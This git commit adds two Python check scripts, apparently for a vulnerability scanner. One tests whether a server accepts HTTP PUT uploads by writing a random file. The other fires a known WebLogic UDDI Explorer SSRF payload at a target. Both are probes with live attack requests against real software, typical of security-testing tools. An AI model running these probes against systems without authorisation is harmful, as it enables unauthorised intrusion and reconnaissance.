e213466ef86c3c48fc1f765f1e3bc9c897058be3
al0ne <13449320+al0ne@users.noreply.github.com>
2019-06-25 10:26:39 +0800

    PUSH

---
+++ script/http_put.py
@@ -0,0 +1,26 @@
+import requests
+import random
+from lib.random_header import get_ua
+from lib.verify import get_list
+
+
+def put(url):
+    url = url.strip('/')
+    text = random.randint(100000000, 200000000)
+    payload = '/{}.txt'.format(text)
+    url = url + payload
+    data = {'{}'.format(text): '{}'.format(text)}
+    r = requests.put(url, data=data, allow_redirects=False, verify=False, headers=get_ua())
+    if r.status_code == 201:
+        return 'HTTP METHOD PUT url: {}'.format(url)
+
+
+def check(ip, ports, apps):
+    try:
+        probe = get_list(ip, ports)
+        for url in probe:
+            result = put(url)
+    except Exception as e:
+        pass
+    if result:
+        return result
---
+++ script/weblogic_ssrc.py
@@ -0,0 +1,26 @@
+import requests
+from lib.random_header import get_ua
+from lib.verify import get_list
+
+
+def weblogic_ssrf(url):
+    url = url.strip('/')
+    payload = r"/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:27989"
+    url = url + payload
+    r = requests.get(url, allow_redirects=False, verify=False, headers=get_ua())
+    if 'could not connect over HTTP to server' in r.text:
+        return 'Weblogic SSRF url: {}'.format(url)
+
+
+def check(ip, ports, apps):
+    try:
+        probe = get_list(ip, ports)
+        for url in probe:
+            payload = '/uddiexplorer/SearchPublicRegistries.jsp'
+            r = requests.get(url + payload, timeout=3, headers=get_ua())
+            if 'UDDI Explorer' in r.text:
+                result = weblogic_ssrf(url)
+    except Exception as e:
+        pass
+    if result:
+        return result
